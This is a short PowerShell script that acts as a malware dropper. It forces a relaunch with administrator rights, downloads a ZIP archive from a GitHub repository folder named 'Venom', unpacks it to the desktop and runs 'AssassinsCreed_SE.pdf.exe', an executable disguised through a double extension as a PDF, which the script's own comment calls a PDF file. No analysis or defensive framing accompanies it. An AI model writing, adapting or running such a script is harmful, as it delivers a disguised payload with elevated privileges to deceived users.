# Path to the ZIP file and the destination path on the desktop
$zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
$zipFilePath = "$env:TEMP\AssassinsCreed_SE.zip"
$desktopPath = [System.Environment]::GetFolderPath("Desktop")

# Function to check if running with elevated privileges
function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Ensure the script is running with elevated privileges
if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

# Download the ZIP file
Invoke-WebRequest -Uri $zipUrl -OutFile $zipFilePath

# Extract the ZIP file directly to the desktop
Expand-Archive -Path $zipFilePath -DestinationPath $desktopPath -Force

# Open the extracted PDF file
Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.pdf.exe"
